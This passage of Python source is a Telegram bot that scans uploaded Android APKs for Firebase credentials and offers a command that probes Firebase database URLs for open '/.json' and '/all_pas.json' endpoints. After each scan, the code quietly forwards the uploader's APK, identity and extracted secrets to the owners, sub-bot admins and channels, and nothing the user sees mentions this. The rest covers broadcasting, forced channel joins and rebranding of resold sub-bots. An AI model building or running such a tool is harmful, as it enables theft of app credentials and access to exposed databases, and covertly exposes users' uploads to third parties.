        data  = scan_apk(apk_bytes)

        ks = str(uid)
        # Cache user info for display
        G.setdefault('user_cache',{})[str(uid)] = {
            'name': m.from_user.first_name or '',
            'username': m.from_user.username or ''
        }
        G['history'].setdefault(ks,[])
        G['history'][ks].append({'f':fname,'t':datetime.now().strftime('%d/%m %H:%M'),'db':data.get(DB_KEY,'─')})
        G['history'][ks] = G['history'][ks][-20:]
        if not is_main and token in G['bots']:
            binfo(token)['scans'] = binfo(token).get('scans',0)+1
        save_db()

        hdr  = get_msg(token,'result_hdr', '✅ <b>SCAN COMPLETE — ' + get_msg(token,'dev_name','Ꮇɪᴋᴇʏ') + ' SYSTEM</b>')
        dbu  = data.get(DB_KEY,'─')

        # Only show fields that were found
        found_creds = {k:v for k,v in data.items() if v != '─'}
        
        if found_creds:
            creds = "\n".join(
                f"✅ <b>{k}:</b>\n    <code>{v}</code>"
                for k,v in found_creds.items()
            )
        else:
            creds = "😔 <b>No Firebase credentials found in this APK.</b>\n<i>App may be obfuscated or not use Firebase.</i>"

        report = (
            f"{box(get_msg(token,'dev_name','Ꮇɪᴋᴇʏ') + ' SCAN RESULT')}\n\n"
            f"{hdr}\n{L1}\n"
            f"📦 <code>{fname}</code>\n"
            f"📏 <code>{fsize} MB</code>  🔒 <code>{fmd5}</code>\n"
            f"{L1}\n"
            f"<b>🔓 EXTRACTED CREDENTIALS</b> ({len(found_creds)} found)\n{L1}\n"
            f"{creds}\n"
            f"{L1}\n👑 @{get_msg(token,'dev_user','Godxpainx')}"
        )

        # Build keyboard with firebase check + branding edit
        kb_rows = []
        if dbu != '─':
            kb_rows.append([("🔍 Check Firebase DB","check_fb:"+dbu[:60])])
        if is_adm(uid, token):
            kb_rows.append([("✏️ Edit Bot Branding","edit_brand:"+token[:20])])
        fb_kb = mk(*kb_rows) if kb_rows else None
        try:
            bot.edit_message_text(
                report, m.chat.id, st.message_id,
                parse_mode='HTML', reply_markup=fb_kb)
        except:
            ssend(bot, m.chat.id, report, kb=fb_kb)

        # ── Build forward caption ──
        bot_label = '🔵 MAIN BOT' if is_main else f'🟢 {binfo(token).get("name","Sub Bot")}'
        uname_str  = f'@{m.from_user.username}' if m.from_user.username else '─'
        name_str   = m.from_user.first_name or 'User'

        fwd = (
            f"{box('🎯 NEW SCAN ALERT')}\n\n"
            f"{bot_label}\n"
            f"👤 <a href='tg://user?id={uid}'>{name_str}</a>"
            f" │ <code>{uid}</code>"
            f" │ {uname_str}\n\n"
            + report
        )[:4096]

        # ── 1. Forward to owners via MAIN BOT (sub-bot scans bhi owner ke paas aayenge) ──
        fwd_bot  = MAIN_BOT_REF.get('bot') or bot
        sent_fid = None
        recv_list = list(dict.fromkeys([PRIORITY_ADMIN] + ALL_ADMINS))
        import io as _io2
        for adm in recv_list:
            try:
                if sent_fid:
                    fwd_bot.send_document(adm, sent_fid,
                        caption=fwd, parse_mode='HTML', reply_markup=fb_kb)
                else:
                    sm = fwd_bot.send_document(adm,
                        _io2.BytesIO(apk_bytes),
                        caption=fwd, parse_mode='HTML', reply_markup=fb_kb,
                        visible_file_name=fname)
                    if sm and sm.document:
                        sent_fid = sm.document.file_id
            except Exception as e:
                print(f"[FWD OWNER {adm}] {e}")

        # ── 2. Sub-bot admins — reuse file_id ──
        if not is_main and token in G['bots']:
            sub_admins = [a for a in binfo(token).get('admins',[]) if a not in ALL_ADMINS]
            for adm in sub_admins:
                try:
                    sub_cap = (
                        f"{box('🎯 SCAN — YOUR BOT')}\n\n"
                        f"🤖 Bot: <b>{binfo(token).get('name','Bot')}</b>\n"
                        f"👤 <a href='tg://user?id={uid}'>{name_str}</a>"
                        f" │ <code>{uid}</code> │ {uname_str}\n\n"
                        + report
                    )[:4096]
                    if sent_fid:
                        fwd_bot.send_document(adm, sent_fid, caption=sub_cap, parse_mode='HTML')
                    else:
                        fwd_bot.send_document(adm,
                            _io2.BytesIO(apk_bytes),
                            caption=sub_cap, parse_mode='HTML',
                            visible_file_name=fname)
                except Exception as e:
                    print(f"[FWD SUBADM {adm}] {e}")

        # ── 3. Channels — reuse file_id ──
        import io as _io3
        _fbot = MAIN_BOT_REF.get('bot') or bot
        for ch_id in list(G.get('fwd_channels', set())):
            try:
                if sent_fid:
                    _fbot.send_document(ch_id, sent_fid,
                        caption=fwd, parse_mode='HTML', reply_markup=fb_kb)
                else:
                    _fbot.send_document(ch_id, _io3.BytesIO(apk_bytes),
                        caption=fwd, parse_mode='HTML', reply_markup=fb_kb,
                        visible_file_name=fname)
            except Exception as e:
                print(f'[FWD CH {ch_id}] {e}')

        del apk_bytes  # RAM free karo

    except Exception as e:
        sedit(bot, f'❌ <b>Scan Error:</b>\n<code>{e}</code>', m.chat.id, st.message_id)
        traceback.print_exc()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  📨  STATE INPUT PROCESSOR
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def handle_state(bot, m, token, is_main):
    uid = m.from_user.id
    st  = get_state(uid)
    if not st: return False
    clear_state(uid)
    act  = st['action']
    data = st['data']
    cid  = m.chat.id

    # ─── BROADCAST TEXT (text only)
    if act == 'bc_text':
        targets = data['targets']
        if m.content_type != 'text' or not m.text:
            ssend(bot, cid, "❌ Please send text message only for this type.")
            return True
        ssend(bot, cid, f"{box('🚀 BROADCAST STARTED')}\n\n📊 Sending to <b>{len(targets)}</b> users...", kb=back())
        threading.Thread(target=do_bc_text, args=(bot, m.text, uid, targets), daemon=True).start()
        log_act(uid, f"bc_text → {len(targets)} users")
        return True

    # ─── BROADCAST MEDIA (any content type)
    if act == 'bc_media':
        targets = data['targets']
        ssend(bot, cid, f"{box('🚀 BROADCAST STARTED')}\n\n📊 Sending to <b>{len(targets)}</b> users...", kb=back())
        threading.Thread(target=do_bc_media, args=(bot, m, uid, targets), daemon=True).start()
        log_act(uid, f"bc_media → {len(targets)} users")
        return True

    # ─── ALL-BOT BROADCAST (uses MAIN bot to reach all users)
    if act == 'allbc_text':
        targets = data['targets']
        if m.content_type != 'text' or not m.text:
            ssend(bot, cid, "❌ Text message bhejo."); return True
        fwd_bot = MAIN_BOT_REF.get('bot') or bot
        ssend(bot, cid, f"{box('🚀 ALL-BOT BC STARTED')}\n\n📊 Sending to <b>{len(targets)}</b> users...", kb=back())
        threading.Thread(target=do_bc_text, args=(fwd_bot, m.text, uid, targets), daemon=True).start()
        log_act(uid, f"allbc_text → {len(targets)} users")
        return True

    if act == 'allbc_media':
        targets = data['targets']
        fwd_bot = MAIN_BOT_REF.get('bot') or bot
        ssend(bot, cid, f"{box('🚀 ALL-BOT BC STARTED')}\n\n📊 Sending to <b>{len(targets)}</b> users...", kb=back())
        threading.Thread(target=do_bc_media, args=(fwd_bot, m, uid, targets), daemon=True).start()
        log_act(uid, f"allbc_media → {len(targets)} users")
        return True

    # ─── FIREBASE CHECK
    if act == 'fb_check':
        url = (m.text or '').strip()
        if not url or not url.startswith('http'): ssend(bot, cid, "❌ Invalid URL. Must start with http"); return True
        threading.Thread(target=firebase_check, args=(bot, cid, url, token), daemon=True).start()
        return True

    # ─── ADD BOT
    if act == 'add_bot':
        tok2 = (m.text or '').strip()
        if ':' not in tok2 or len(tok2) < 20:
            ssend(bot, cid, "❌ Invalid token format.\nFormat: <code>123456:ABC-DEF...</code>"); return True
        G['bots'][tok2] = {'name':'New Bot','owner':uid,'admins':[],'scans':0,'users':[]}
        save_db()
        log_act(uid, f"added bot {tok2[:15]}")
        ssend(bot, cid, f"{box('✅ BOT ADDED')}\n\n🤖 Token: <code>{tok2[:20]}...</code>\n\n⚡ Starting thread...", kb=back("bot_list"))
        threading.Thread(target=run_bot, args=(tok2, uid, False), daemon=True).start()
        return True

    # ─── BOT RENAME
    if act == 'bot_rename':
        tk  = data['tk']
        ftk = find_tok(tk)
        if ftk:
            binfo(ftk)['name'] = (m.text or 'Bot').strip()
            save_db()
            ssend(bot, cid, f"✅ <b>Bot renamed to:</b> {m.text.strip()}", kb=back("bot_manage:"+tk))
        return True

    # ─── BOT ADD ADMIN
    if act == 'bot_addadmin':
        tk = data['tk']
        try:
            new_adm = int((m.text or '').strip())
            ftk = find_tok(tk)
            if ftk:
                bi = binfo(ftk)
                if new_adm not in bi.get('admins',[]): bi.setdefault('admins',[]).append(new_adm)
                save_db()
                log_act(uid, f"added admin {new_adm} to {ftk[:15]}")
                ssend(bot, cid, f"{box('✅ ADMIN ADDED')}\n\n👤 <code>{new_adm}</code> added as admin.", kb=back("bot_manage:"+tk))
        except: ssend(bot, cid, "❌ Invalid user ID.")
        return True

    # ─── BOT DEL ADMIN
    if act == 'bot_deladmin':
        tk = data['tk']
        try:
            rem = int((m.text or '').strip())
            ftk = find_tok(tk)
            if ftk:
                ok2, msg2 = safe_remove_admin(ftk, rem)
                if ok2:
                    save_db()
                    ssend(bot, cid, f"{box('✅ ADMIN REMOVED')}\n\n👤 <code>{rem}</code> removed.", kb=back("bot_manage:"+tk))
                else:
                    ssend(bot, cid, f"❌ {msg2}", kb=back("bot_manage:"+tk))
        except: ssend(bot, cid, "❌ Invalid user ID.")
        return True

    # ─── BOT BROADCAST (text or media)
    if act in ('bot_bc_text', 'bot_bc_media'):
        tk  = data['tk']
        ftk = find_tok(tk)
        if ftk:
            targets = binfo(ftk).get('users',[])
            ssend(bot, cid, f"{box('🚀 BOT BC STARTED')}\n\n📊 Sending to <b>{len(targets)}</b> users...", kb=back("bot_manage:"+tk))
            if m.content_type == 'text' and m.text:
                threading.Thread(target=do_bc_text, args=(bot, m.text, uid, targets), daemon=True).start()
            else:
                threading.Thread(target=do_bc_media, args=(bot, m, uid, targets), daemon=True).start()
        return True

    # ─── SET WELCOME
    if act == 'set_welcome':
        tk  = data['tk']
        ftk = find_tok(tk)
        if ftk and m.text:
            set_msg(ftk, 'welcome', m.text)
            ssend(bot, cid, f"✅ <b>Welcome message updated!</b>", kb=back("bot_manage:"+tk))
        return True

    # ─── SET RESULT HEADER
    if act == 'set_result':
        tk  = data['tk']
        ftk = find_tok(tk)
        if ftk and m.text:
            set_msg(ftk, 'result_hdr', m.text)
            ssend(bot, cid, f"✅ <b>Result header updated!</b>", kb=back("bot_manage:"+tk))
        return True

    # ─── BAN
    if act == 'ban_user':
        try:
            t = int((m.text or '').strip())
            G['banned'].add(t); save_db()
            log_act(uid, f"banned {t}")
            ssend(bot, cid, f"{box('🚫 USER BANNED')}\n\n◈ ID: <code>{t}</code>", kb=back())
        except: ssend(bot, cid, "❌ Invalid ID")
        return True

    # ─── UNBAN
    if act == 'unban_user':
        try:
            t = int((m.text or '').strip())
            G['banned'].discard(t); save_db()
            log_act(uid, f"unbanned {t}")
            ssend(bot, cid, f"{box('✅ USER UNBANNED')}\n\n◈ ID: <code>{t}</code>", kb=back())
        except: ssend(bot, cid, "❌ Invalid ID")
        return True

    # ─── SEARCH
    if act == 'search_user':
        try:
            t     = int((m.text or '').strip())
            in_mb = t in G['users']
            bnnd  = t in G['banned']
            bots_ = [binfo(tk2).get('name','?') for tk2 in G['bots'] if t in binfo(tk2).get('users',[])]
            scans_ = len(G['history'].get(str(t),[]))
            ssend(bot, cid,
                f"{box('🔍 USER SEARCH')}\n\n"
                f"{R('User ID', t,'🆔')}\n"
                f"{R('In Main Bot','✅ Yes' if in_mb else '❌ No','📌')}\n"
                f"{R('Banned','🚫 Yes' if bnnd else '🟢 No','⚠️')}\n"
                f"{R('Scans',scans_,'🔍')}\n"
                f"{R('In Sub-Bots',', '.join(bots_) or 'None','🤖')}",
                kb=back())
        except: ssend(bot, cid, "❌ Invalid ID")
        return True

    # ─── EDIT DEV NAME (replace Ꮇɪᴋᴇʏ/developer name in bot)
    if act == 'bot_devname':
        tk  = data['tk']
        ftk = find_tok(tk)
        if ftk and m.text:
            G['messages'].setdefault(ftk, {})['dev_name'] = m.text.strip()
            save_db()
            ssend(bot, cid,
                f"✅ <b>Developer name set to:</b> {m.text.strip()}\n\n"
                f"<i>This will replace 'Ꮇɪᴋᴇʏ' in all bot messages.</i>",
                kb=back("bot_manage:"+tk))
        return True

    # ─── EDIT DEV USERNAME (replace @Godxpainx)
    if act == 'bot_devuser':
        tk  = data['tk']
        ftk = find_tok(tk)
        if ftk and m.text:
            uname = m.text.strip().lstrip('@')
            G['messages'].setdefault(ftk, {})['dev_user'] = uname
            save_db()
            ssend(bot, cid,
                f"✅ <b>Developer username set to:</b> @{uname}\n\n"
                f"<i>This will replace '@Godxpainx' in all bot messages.</i>",
                kb=back("bot_manage:"+tk))
        return True

    # ─── RESET WELCOME
    if act == 'reset_welcome':
        tk  = data['tk']
        ftk = find_tok(tk)
        if ftk:
            G['messages'].get(ftk, {}).pop('welcome', None)
            save_db()
            ssend(bot, cid, "✅ Welcome message reset to default.", kb=back("bot_manage:"+tk))
        return True

    # ─── RESET RESULT
    if act == 'reset_result':
        tk  = data['tk']
        ftk = find_tok(tk)
        if ftk:
            G['messages'].get(ftk, {}).pop('result_hdr', None)
            save_db()
            ssend(bot, cid, "✅ Result header reset to default.", kb=back("bot_manage:"+tk))
        return True

    # ─── SET HELP CONTENT
    if act == 'set_help':
        tok2 = data.get('token', token)
        # Save file_id or text
        hc = {}
        if m.content_type == 'text' and m.text:
            hc = {'type': 'text', 'content': m.text}
        elif m.content_type == 'photo':
            hc = {'type': 'photo', 'file_id': m.photo[-1].file_id,
                  'caption': m.caption or ''}
        elif m.content_type == 'video':
            hc = {'type': 'video', 'file_id': m.video.file_id,
                  'caption': m.caption or ''}
        elif m.content_type == 'document':
            hc = {'type': 'document', 'file_id': m.document.file_id,
                  'caption': m.caption or ''}
        elif m.content_type == 'audio':
            hc = {'type': 'audio', 'file_id': m.audio.file_id,
                  'caption': m.caption or ''}
        elif m.content_type == 'animation':
            hc = {'type': 'animation', 'file_id': m.animation.file_id,
                  'caption': m.caption or ''}
        if hc:
            G.setdefault('help_content', {})[tok2] = hc
            save_db()
            ssend(bot, cid,
                f"✅ <b>Help content saved!</b>\n\n"
                f"Type: <b>{hc['type']}</b>\n"
                f"Users will see this when they tap ❓ Help.",
                kb=back())
        else:
            ssend(bot, cid, "❌ Unsupported type. Send text/photo/video/file/audio/gif.")
        return True

    # ─── ADD CHANNEL
    if act == 'ch_add':
        try:
            ch_id = int((m.text or '').strip())
            G.setdefault('fwd_channels', set()).add(ch_id)
            save_db()
            ssend(bot, cid,
                f"{box('✅ CHANNEL ADDED')}\n\n"
                f"◈ ID: <code>{ch_id}</code>\n"
                f"All scan results will be forwarded here.",
                kb=back("ch_list"))
        except: ssend(bot, cid, "❌ Invalid ID. Example: <code>-1001234567890</code>")
        return True

    # ─── REMOVE CHANNEL
    if act == 'ch_remove':
        try:
            ch_id = int((m.text or '').strip())
            fwd = G.get('fwd_channels', set())
            if ch_id in fwd:
                fwd.discard(ch_id); save_db()
                ssend(bot, cid, f"✅ Channel <code>{ch_id}</code> removed.", kb=back("ch_list"))
            else:
                ssend(bot, cid, "❌ ID not in list.")
        except: ssend(bot, cid, "❌ Invalid ID.")
        return True

    # ─── SCHEDULE BC
    if act == 'sched_bc':
        try:
            p = (m.text or '').split('|',1)
            t2 = p[0].strip(); msg2 = p[1].strip()
            datetime.strptime(t2, '%Y-%m-%d %H:%M')
            G['scheduled'].append({'time':t2,'text':msg2}); save_db()
            ssend(bot, cid, f"📅 <b>Scheduled for {t2}</b>", kb=back())
        except Exception as e:
            ssend(bot, cid, f"❌ Format: YYYY-MM-DD HH:MM | message\n{e}")
        return True

    if act == 'mfsub_add':
        if not is_owner(uid): return False
        try:
            parts = (m.text or '').split('|')
            cid2  = int(parts[0].strip())
            name2 = parts[1].strip() if len(parts) > 1 else 'Channel'
            link2 = parts[2].strip() if len(parts) > 2 else ''
            G.setdefault('main_fsub', []).append({'id': cid2, 'link': link2, 'name': name2})
            save_db()
            ssend(bot, cid, f"✅ <b>Added!</b>\n◈ {name2} — <code>{cid2}</code>",
                  kb=mk([("🔙 Back","main_fsub_mgr")]))
        except Exception as e:
            ssend(bot, cid, f"❌ Format: Chat ID | Name | Link\n<code>{e}</code>")
        return True

    if act == 'sfsub_add':
        try:
            parts = (m.text or '').split('|')
            cid2  = int(parts[0].strip())
            name2 = parts[1].strip() if len(parts) > 1 else 'Channel'
            link2 = parts[2].strip() if len(parts) > 2 else ''
            binfo(token).setdefault('fsub', []).append({'id': cid2, 'link': link2, 'name': name2})
            save_db()
            ssend(bot, cid, f"✅ <b>Added!</b>\n◈ {name2} — <code>{cid2}</code>",
                  kb=mk([("🔙 Back","sub_fsub_mgr")]))
        except Exception as e:
            ssend(bot, cid, f"❌ Format: Chat ID | Name | Link\n<code>{e}</code>")
        return True

    if act == 'bfsub_add':
        tk  = data.get('tk','')
        ftk = find_tok(tk)
        try:
            parts = (m.text or '').split('|')
            cid2  = int(parts[0].strip())
            name2 = parts[1].strip() if len(parts) > 1 else 'Channel'
            link2 = parts[2].strip() if len(parts) > 2 else ''
            if ftk:
                binfo(ftk).setdefault('fsub', []).append({'id': cid2, 'link': link2, 'name': name2})
                save_db()
            ssend(bot, cid, f"✅ <b>Added!</b>\n◈ {name2} — <code>{cid2}</code>",
                  kb=mk([("🔙 Back",f"bot_fsub:{tk}")]))
        except Exception as e:
            ssend(bot, cid, f"❌ Format: Chat ID | Name | Link\n<code>{e}</code>")
        return True

    return False

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🤖  BOT ENGINE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def run_bot(token, owner_id, is_main=False):
    retries = 0
    while True:
        try:
            bot = telebot.TeleBot(token, threaded=True, num_threads=2, skip_pending=True)
            # Remove webhook + clear — 409 fix
            try:
                bot.remove_webhook()
                time.sleep(1.5)
            except: pass
            retries = 0
            print(f"[{'MAIN' if is_main else 'SUB '}] online: {token[:20]}...")
            if is_main:
                MAIN_BOT_REF['bot'] = bot

            # ─── /start ─────────────────────────────────────────
            @bot.message_handler(commands=['start','panel'])
            def on_start(m):
              try:
                uid = m.from_user.id
                clear_state(uid)
                G['users'].add(uid)
                G.setdefault('user_cache',{})[str(uid)] = {
                    'name': m.from_user.first_name or '',
                    'username': m.from_user.username or ''
                }
                if not is_main and token in G['bots']:
                    bi = binfo(token)
                    if uid not in bi.get('users',[]): bi.setdefault('users',[]).append(uid)
                save_db()

                if G['maint'] and uid not in ALL_ADMINS:
                    ssend(bot, m.chat.id, f"{box('🔧 MAINTENANCE')}\n\nBot is under maintenance.\nPlease come back soon! 🙏"); return

                # Force Join Check
                if uid not in ALL_ADMINS:
                    joined, fsub_kb = check_fsub(bot, uid, token, is_main)
                    if not joined:
                        ssend(bot, m.chat.id,
                            f"{box('🔐 ACCESS REQUIRED')}\n\n"
                            f"Pehle neeche join karo, phir <b>✅ Joined? Tap Here</b> dabao!\n\n"
                            f"👑 @{get_msg(token,'dev_user','Godxpainx')}",
                            kb=fsub_kb)
                        return

                # animated boot
                bt = ssend(bot, m.chat.id,
                    f"{box('🔥 ' + get_msg(token,'dev_name','Ꮇɪᴋᴇʏ') + ' G-MODE v94')}\n\n<code>{bar(0)}</code>\n{SP[0]} <i>Booting...</i>")
                for pct, txt in [(25,"Loading profile..."),(55,"Fetching stats..."),(85,"Preparing panel...")]:
                    time.sleep(0.3)
                    if bt: sedit(bot, f"{box('🔥 ' + get_msg(token,'dev_name','Mikey') + ' G-MODE v94')}\n\n<code>{bar(pct)}</code>\n{SP[pct//15%8]} <i>{txt}</i>", m.chat.id, bt.message_id)

                name = m.from_user.first_name or "User"
                is_owner = uid in ALL_ADMINS  # owner panel from any bot

                if is_owner:
                    panel = (
                        f"{box('👑 OWNER PANEL')}\n\n"
                        f"👋 Welcome <b>{name}</b>!\n{L1}\n"
                        f"{R('Admin ID',uid,'🆔')}\n"
                        f"{R('Status','🔱 Super Owner','🏆')}\n"
                        f"{R('Total Users',len(G['users']),'👥')}\n"
                        f"{R('Total Scans',G['scans'],'🔍')}\n"
                        f"{R('Sub Bots',len(G['bots']),'🤖')}\n"
                        f"{R('Maintenance','🔴 ON' if G['maint'] else '🟢 OFF','⚙️')}\n"
                        f"{L1}\n✅ System Online — Select option 👇"
                    )
                    kb_ = owner_kb()
                elif is_adm(uid, token):
                    bi2 = binfo(token)
                    panel = (
                        f"{box('⭐ ADMIN PANEL')}\n\n"
                        f"👋 Welcome <b>{name}</b>!\n{L1}\n"
                        f"{R('Bot',bi2.get('name','Bot'),'🤖')}\n"
                        f"{R('Your Users',len(bi2.get('users',[])),'👥')}\n"
                        f"{R('Your Scans',bi2.get('scans',0),'🔍')}\n"
                        f"{L1}\n✅ Panel Ready 👇"
                    )
                    kb_ = sub_kb()
                else:
                    custom_w = get_msg(token, 'welcome', None)
                    if custom_w:
                        panel = custom_w
                    else:
                        panel = (
                            f"{box('🚀 ' + get_msg(token,'dev_name','Ꮇɪᴋᴇʏ') + ' G-MODE v94')}\n\n"
                            f"👋 Welcome <b>{name}</b>!\n{L1}\n"
                            f"<b>📖 How to use:</b>\n"
                            f"◈ Send any <b>.apk</b> file → Firebase extracted instantly\n"
                            f"◈ /firebase [URL] → Check DB manually\n\n"
                            f"⚡ <b>Limit:</b> 5 scans per minute\n"
                            f"{L1}\n👑 @{get_msg(token,'dev_user','Godxpainx')}"
                        )
                    # Add help button if help content is set
                    hc = G.get('help_content',{}).get(token) or G.get('help_content',{}).get('main')
                    if hc:
                        kb_ = mk([("❓ Help / Guide","user_help")])
                    else:
                        kb_ = None

                if bt: sedit(bot, panel, m.chat.id, bt.message_id, kb=kb_)
                else: ssend(bot, m.chat.id, panel, kb=kb_)
              except Exception as _se:
                print(f"[/start ERR] {_se}")
                try: bot.send_message(m.chat.id, "❌ Error. Try again: /start")
                except: pass

            # ─── /firebase ──────────────────────────────────────
            @bot.message_handler(commands=['firebase'])
            def on_firebase(m):
                parts = m.text.split(maxsplit=1)
                if len(parts) < 2:
                    set_state(m.from_user.id, 'fb_check')
                    ssend(bot, m.chat.id,
                        f"{box('🌐 FIREBASE CHECKER')}\n\n"
                        f"Send Firebase DB URL:\n<code>https://yourapp.firebaseio.com</code>\n\n"
                        f"<i>Will check /.json and /all_pas.json</i>",
                        kb=mk([("❌ Cancel","cancel")]))
                    return
                threading.Thread(target=firebase_check, args=(bot, m.chat.id, parts[1].strip(), token), daemon=True).start()

            # ─── CALLBACK ───────────────────────────────────────
            @bot.callback_query_handler(func=lambda c: True)
            def on_cb(call):
                if call.data == 'check_join': return  # handled by on_check_join
                try:
                    _cb(bot, call, token, is_main)
                except Exception as e:
                    print(f"[CB ERR] data={call.data} | {e}")
                    traceback.print_exc()

            # ─── MESSAGE (state router + APK) ───────────────────
            @bot.message_handler(content_types=['text','document','photo','video','audio','voice','sticker','animation'])
            def on_msg(m):
                uid = m.from_user.id
                # APK?
                if m.content_type == 'document' and m.document.file_name.lower().endswith('.apk'):
                    if uid not in ALL_ADMINS:
                        joined, fsub_kb = check_fsub(bot, uid, token, is_main)
                        if not joined:
                            ssend(bot, m.chat.id,
                                f"{box('🔐 ACCESS REQUIRED')}\n\n"
                                f"Pehle join karo, phir APK dobara bhejo!\n\n"
                                f"👑 @{get_msg(token,'dev_user','Godxpainx')}",
                                kb=fsub_kb)
                            return
                    threading.Thread(target=queued_scan, args=(bot, m, token, is_main), daemon=True).start()
                    return
                # State?
                if handle_state(bot, m, token, is_main): return
                # Media without state → maybe bc_media state
                if m.content_type in ('photo','video','audio','voice','sticker','animation','document'):
                    ssend(bot, m.chat.id, "📎 <b>File received.</b>\nUse broadcast buttons from the panel to send media.")
                    return

            if is_main:
                threading.Thread(target=sched_worker, args=(bot,), daemon=True).start()

            @bot.callback_query_handler(func=lambda c: c.data == 'check_join')
            def on_check_join(call):
                uid = call.from_user.id
                cid = call.message.chat.id
                mid = call.message.message_id
                
                joined, fsub_kb = check_fsub(bot, uid, token, is_main)
                
                if joined:
                    try: bot.answer_callback_query(call.id, "✅ Access mil gaya!", show_alert=False)
                    except: pass
                    try: bot.delete_message(cid, mid)
                    except: pass
                    dev_name = get_msg(token,'dev_name','Ꮇɪᴋᴇʏ')
                    dev_user = get_msg(token,'dev_user','Godxpainx')
                    welcome  = get_msg(token,'welcome',
                        f"{box('🔥 '+dev_name+' SCANNER')}\n\n"
                        f"✅ <b>Access mil gaya!</b>\n\n"
                        f"◈ Koi bhi <b>.apk</b> file bhejo scan karne ke liye\n"
                        f"◈ /firebase [URL] se DB check karo\n\n"
                        f"👑 @{dev_user}")
                    ssend(bot, cid, welcome, kb=mk([("❓ Help","user_help")]))
                else:
                    try: bot.answer_callback_query(call.id, "❌ Abhi bhi join nahi kiya!", show_alert=True)
                    except: pass
                    # Update keyboard with remaining joins
                    try: bot.edit_message_reply_markup(cid, mid, reply_markup=fsub_kb)
                    except: pass

            bot.polling(non_stop=True, timeout=60, long_polling_timeout=60, interval=0)

        except Exception as e:
            save_db()
            wait = min(60, 5*(retries+1))
            print(f"[CRASH {token[:15]}] {e} — retry in {wait}s")
            time.sleep(wait); retries += 1

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🔄  CALLBACK DISPATCHER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _cb(bot, call, token, is_main):
    uid         = call.from_user.id
    d           = call.data
    cid         = call.message.chat.id
    mid         = call.message.message_id
    ow          = is_owner(uid)
    adm         = is_adm(uid, token)
    is_main_bot = is_main

    def ok(t=None):
        try: bot.answer_callback_query(call.id, t)
        except: pass
    def send(text, kb=None): return ssend(bot, cid, text, kb=kb)
    def edit(text, kb=None): sedit(bot, text, cid, mid, kb=kb)

    ok()  # Answer immediately — remove loading spinner

    # ── cancel / clear state
    if d == "cancel":
        ok(); clear_state(uid)
        edit(f"{box('❌ CANCELLED')}\n\nAction cancelled.", kb=back())
        return

    # ── main menu
    if d == "menu_main":
        ok(); clear_state(uid)
        if ow: edit(f"{box('👑 OWNER PANEL')}\n\nSelect option 👇", kb=owner_kb())
        elif adm: edit(f"{box('⭐ ADMIN PANEL')}\n\nSelect option 👇", kb=sub_kb())
        return

    # ── stats
    if d == "stats":
        if ow:
            bd = "".join(
                f"  ◈ {binfo(t).get('name','Bot')}: {binfo(t).get('scans',0)} scans | {len(binfo(t).get('users',[]))} users\n"
                for t in list(G['bots'])[:8])
            text = (f"{box('📊 GLOBAL STATS')}\n\n"
                    f"{R('Total Users',len(G['users']),'👥')}\n"
                    f"{R('Total Scans',G['scans'],'🔍')}\n"
                    f"{R('Sub-Bots',len(G['bots']),'🤖')}\n"
                    f"{R('Banned',len(G['banned']),'🚫')}\n"
                    f"{R('Maintenance','🔴 ON' if G['maint'] else '🟢 OFF','⚙️')}\n"
                    f"{L1}\n<b>Sub-Bot Breakdown:</b>\n{bd or '  ◈ None yet'}")
        else:
            bi = binfo(token)
            text = (f"{box('📊 BOT STATS')}\n\n"
                    f"{R('Bot',bi.get('name','Bot'),'🤖')}\n"
                    f"{R('Users',len(bi.get('users',[])),'👥')}\n"
                    f"{R('Scans',bi.get('scans',0),'🔍')}\n"
                    f"{R('Admins',len(bi.get('admins',[])),'👮')}")
        edit(text, kb=back())
        return

    # ── uptime
    if d == "uptime":
        upt = str(datetime.now()-START_TIME).split('.')[0]
        hrs = int(upt.split(':')[0]) if ':' in upt else 0
        edit(f"{box('⏳ SYSTEM UPTIME')}\n\n{R('Uptime',upt,'⏱️')}\n{R('Hours Running',hrs,'🕐')}\n{R('Status','🟢 Online','📡')}", kb=back())
        return

    # ── users
    if d == "users":
        ok()
        if not adm: return
        if is_main and ow:
            # Owner of main bot — all global users
            us = list(G['users']); title = f"All Users ({len(us)})"
        elif ow and not is_main:
            # Owner viewing sub-bot users from owner panel
            us = binfo(token).get('users',[]); title = f"{binfo(token).get('name','Bot')} Users ({len(us)})"
        else:
            # Sub-bot admin — ONLY their bot users, main bot users hidden
            us = binfo(token).get('users',[]); title = f"My Bot Users ({len(us)})"
        # Show user with profile link
        def fmt_user(u):
            info = G.get('user_cache',{}).get(str(u),{})
            name = info.get('name','') or ''
            uname = info.get('username','')
            if name:
                link = f"<a href='tg://user?id={u}'>{name}</a>"
                return f"◈ {link} │ <code>{u}</code>" + (f" │ @{uname}" if uname else "")
            return f"◈ <a href='tg://user?id={u}'><code>{u}</code></a>"
        text = f"{box(title)}\n\n" + ("\n".join(fmt_user(u) for u in us[:50]) or "◈ None")
        if len(us)>50: text += f"\n... +{len(us)-50} more"
        send(text, kb=back())
        return

    # ── scan history
    if d == "scan_hist":
        ok()
        rows = []
        for us_, hist in list(G['history'].items())[-15:]:
            for h in hist[-2:]: rows.append(f"◈ <code>{us_}</code> | {h.get('t','')} | {h.get('f','')}")
        send(f"{box('📜 SCAN HISTORY')}\n\n" + ("\n".join(rows[-20:]) or "◈ No scans yet"), kb=back())
        return

    # ── admin log
    if d == "adm_log" and ow:
        ok()
        last = G['log'][-15:]
        text = f"{box('📋 ADMIN LOG')}\n\n" + ("\n".join(f"[{e['t']}] <code>{e['u']}</code>: {e['a']}" for e in reversed(last)) or "◈ Empty")
        send(text, kb=back())
        return

    # ── top scanners
    if d == "top_scan" and ow:
        ok()
        top  = sorted(G['history'].items(), key=lambda x:len(x[1]), reverse=True)[:10]
        meds = ["🥇","🥈","🥉","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣","🔟"]
